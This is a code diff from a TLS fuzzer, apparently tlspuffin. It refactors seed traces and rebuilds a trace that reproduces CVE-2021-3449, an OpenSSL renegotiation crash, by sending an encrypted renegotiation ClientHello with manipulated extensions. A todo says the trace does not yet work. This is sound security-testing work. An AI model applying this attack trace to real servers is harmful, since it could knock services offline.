@@ -255,9 +255,7 @@ pub fn seed_successful12(client: AgentName, server: AgentName) -> Trace {
                 action: Action::Input(InputAction {
                     recipe: Term::Application {
                         op: op_server_key_exchange.clone(),
-                        args: vec![
-                            Term::Variable(sig.new_var::<Payload>((1, 2))),
-                        ],
+                        args: vec![Term::Variable(sig.new_var::<Payload>((1, 2)))],
                     },
                 }),
             },
@@ -343,43 +341,6 @@ pub fn seed_successful12(client: AgentName, server: AgentName) -> Trace {
             },
         ],
     }
-}
-
-// todo https://gitlab.inria.fr/mammann/tlspuffin/-/issues/40
-// todo it seems this needs to be encrypted? somehow the server is not processing this data
-pub fn seed_cve_2021_3449(client: AgentName, server: AgentName) -> Trace {
-    let mut sig = Signature::default();
-    let op_client_hello = sig.new_op(&op_client_hello);
-    let op_attack_cve_2021_3449 = sig.new_op(&op_attack_cve_2021_3449);
-
-    let mut trace = seed_successful12(client, server);
-
-    trace.steps.push(Step {
-        agent: server,
-        action: Action::Input(InputAction {
-            recipe: Term::Application {
-                op: op_client_hello,
-                args: vec![
-                    Term::Variable(sig.new_var::<ProtocolVersion>((0, 0))),
-                    Term::Variable(sig.new_var::<Random>((0, 0))),
-                    Term::Variable(sig.new_var::<SessionID>((0, 0))),
-                    Term::Variable(sig.new_var::<Vec<CipherSuite>>((0, 0))),
-                    Term::Variable(sig.new_var::<Vec<Compression>>((0, 0))),
-                    Term::Application {
-                        op: op_attack_cve_2021_3449,
-                        args: vec![Term::Variable(sig.new_var::<Vec<ClientExtension>>((0, 0)))],
-                    },
-                ],
-            },
-        }),
-    });
-
-    trace.steps.push(Step {
-        agent: server,
-        action: Action::Output(OutputAction { id: 4 }),
-    });
-
-    trace
 }
 
 pub fn seed_client_attacker(client: AgentName, server: AgentName) -> Trace {
@@ -549,7 +510,7 @@ pub fn seed_client_attacker(client: AgentName, server: AgentName) -> Trace {
     trace
 }
 
-pub fn seed_client_attacker12(client: AgentName, server: AgentName) -> Trace {
+pub fn seed_client_attacker12(client: AgentName, server: AgentName) -> (Trace, Term) {
     let mut s = Signature::default();
 
     let client_hello = app!(
@@ -561,7 +522,7 @@ pub fn seed_client_attacker12(client: AgentName, server: AgentName) -> Trace {
         // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
         app_const!(s, op_cipher_suites12),
         app_const!(s, op_compressions),
-        // todo We are not sending RenegotiationInfo, CertificateStatusRequest Extensions
+        // todo CertificateStatusRequest Extension
         app!(
             s,
             op_extensions_append,
@@ -574,15 +535,26 @@ pub fn seed_client_attacker12(client: AgentName, server: AgentName) -> Trace {
                     app!(
                         s,
                         op_extensions_append,
-                        app_const!(s, op_extensions_new),
-                        app_const!(s, op_x25519_support_group_extension),
+                        app!(
+                            s,
+                            op_extensions_append,
+                            app!(
+                                s,
+                                op_extensions_append,
+                                app_const!(s, op_extensions_new),
+                                app_const!(s, op_x25519_support_group_extension),
+                            ),
+                            app_const!(s, op_signature_algorithm_extension)
+                        ),
+                        app_const!(s, op_ec_point_formats)
                     ),
-                    app_const!(s, op_signature_algorithm_extension)
+                    app_const!(s, op_signature_algorithm_cert_extension)
                 ),
-                app_const!(s, op_ec_point_formats)
+                app_const!(s, op_signed_certificate_timestamp)
             ),
-            app_const!(s, op_signed_certificate_timestamp)
-        ),
+            // Enable Renegotiation
+            app!(s, op_renegotiation_info, app_const!(s, empty_bytes_vec)),
+        )
     );
 
     let server_hello_transcript = app!(
@@ -634,6 +606,15 @@ pub fn seed_client_attacker12(client: AgentName, server: AgentName) -> Trace {
         server_hello_done_transcript.clone(),
         client_key_exchange.clone()
     );
+
+    let client_verify_data = app!(
+        s,
+        op_sign_transcript,
+        var!(s, Random, (0, 0)),
+        app!(s, op_decode_ecdh_params, var!(s, Payload, (0, 2))), // ServerECDHParams
+        client_key_exchange_transcript.clone()
+    );
+
     let trace = Trace {
         descriptors: vec![
             AgentDescriptor {
@@ -676,17 +657,7 @@ pub fn seed_client_attacker12(client: AgentName, server: AgentName) -> Trace {
                     recipe: app!(
                         s,
                         op_encrypt12,
-                        app!(
-                            s,
-                            op_finished12,
-                            app!(
-                                s,
-                                op_sign_transcript,
-                                var!(s, Random, (0, 0)),
-                                app!(s, op_decode_ecdh_params, var!(s, Payload, (0, 2))), // ServerECDHParams
-                                client_key_exchange_transcript.clone()
-                            )
-                        ),
+                        app!(s, op_finished12, client_verify_data.clone()),
                         var!(s, Random, (0, 0)),
                         app!(s, op_decode_ecdh_params, var!(s, Payload, (0, 2))), // ServerECDHParams
                         app_const!(s, op_seq_0)
@@ -699,6 +670,91 @@ pub fn seed_client_attacker12(client: AgentName, server: AgentName) -> Trace {
             },
         ],
     };
+
+    (trace, client_verify_data)
+}
+
+// todo https://gitlab.inria.fr/mammann/tlspuffin/-/issues/40
+// todo it seems this needs to be encrypted? somehow the server is not processing this data
+pub fn seed_cve_2021_3449(client: AgentName, server: AgentName) -> Trace {
+    let mut s = Signature::default();
+
+    let (mut trace, client_verify_data) = seed_client_attacker12(client, server);
+
+    let renegotiation_client_hello = app!(
+        s,
+        op_client_hello,
+        app_const!(s, op_protocol_version12),
+        app_const!(s, op_random),
+        app_const!(s, op_session_id),
+        // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+        app_const!(s, op_cipher_suites12),
+        app_const!(s, op_compressions),
+        app!(
+            s,
+            op_attack_cve_2021_3449,
+            app!(
+                s,
+                op_extensions_append,
+                app!(
+                    s,
+                    op_extensions_append,
+                    app!(
+                        s,
+                        op_extensions_append,
+                        app!(
+                            s,
+                            op_extensions_append,
+                            app!(
+                                s,
+                                op_extensions_append,
+                                app_const!(s, op_extensions_new),
+                                app_const!(s, op_x25519_support_group_extension),
+                            ),
+                            app_const!(s, op_signature_algorithm_extension)
+                        ),
+                        app_const!(s, op_ec_point_formats)
+                    ),
+                    app_const!(s, op_signature_algorithm_cert_extension)
+                ),
+                // Enable Renegotiation
+                app!(s, op_renegotiation_info, client_verify_data),
+            )
+        )
+    );
+
+    /*    trace.steps.push(Step {
+            agent: server,
+            action: Action::Input(InputAction {
+                recipe: app!(
+                    s,
+                    op_encrypt12,
+                    app_const!(s, op_alert_close_notify),
+                    var!(s, Random, (0, 0)),
+                    app!(s, op_decode_ecdh_params, var!(s, Payload, (0, 2))), // ServerECDHParams
+                    app_const!(s, op_seq_1)
+                ),
+            }),
+        });
+    */
+    trace.steps.push(Step {
+        agent: server,
+        action: Action::Input(InputAction {
+            recipe: app!(
+                s,
+                op_encrypt12,
+                renegotiation_client_hello.clone(),
+                var!(s, Random, (0, 0)),
+                app!(s, op_decode_ecdh_params, var!(s, Payload, (0, 2))), // ServerECDHParams
+                app_const!(s, op_seq_1)
+            ),
+        }),
+    });
+
+    trace.steps.push(Step {
+        agent: server,
+        action: Action::Output(OutputAction { id: 10 }),
+    });
 
     trace
 }
